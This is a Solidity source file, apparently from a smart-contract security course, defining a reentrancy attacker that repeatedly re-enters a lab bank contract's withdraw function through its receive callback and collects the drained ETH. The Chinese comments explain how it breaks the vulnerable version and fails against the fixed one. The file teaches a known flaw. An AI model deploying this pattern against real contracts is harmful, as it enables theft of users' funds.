// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IBank} from "./IBank.sol";

/// @title 重入攻击者
/// @notice 唯一的特殊之处：实现了 receive 回调——凡是给它转 ETH 的交易，
///         控制流都会落到这里，而它在这里"反手再取一次钱"。
/// @dev 用同一个攻击合约同时打漏洞版（得手）与修复版（失败），见第 11 章实验。
contract ReentrancyAttacker {
    IBank public immutable bank;
    address public immutable owner;
    uint256 public stolen;

    error OnlyOwner();
    error MustSendEther();

    constructor(IBank bank_) payable {
        bank = bank_;
        owner = msg.sender;
    }

    /// @notice 攻击入口：存 1 ETH，拿到"合法提款权"，然后开始第一次提款。
    function attack() external payable {
        if (msg.sender != owner) revert OnlyOwner();
        if (msg.value == 0) revert MustSendEther();

        bank.deposit{value: msg.value}();
        // 这次提款会触发 receive，重入循环由此启动
        bank.withdraw(msg.value);
    }

    /// @notice 每次银行转钱过来，都尝试再提一次。
    /// @dev 两个终止守卫，让同一个攻击合约既能打穿漏洞版、又在修复版面前安静退出：
    ///      1) 自己账上余额已被清零时——修复版先把状态改了，重入者看到的是新余额；
    ///      2) 银行 ETH 不够本次提款时——漏洞版被取空，见好就收（否则整体 revert 一无所获）。
    ///      注意：先记账、后判断——被取空前的最后一笔也要算进战利品。
    receive() external payable {
        if (bank.balances(address(this)) == 0) return;
        stolen += msg.value;
        if (address(bank).balance < msg.value) return;
        bank.withdraw(msg.value);
    }

    function collect() external {
        if (msg.sender != owner) revert OnlyOwner();
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}
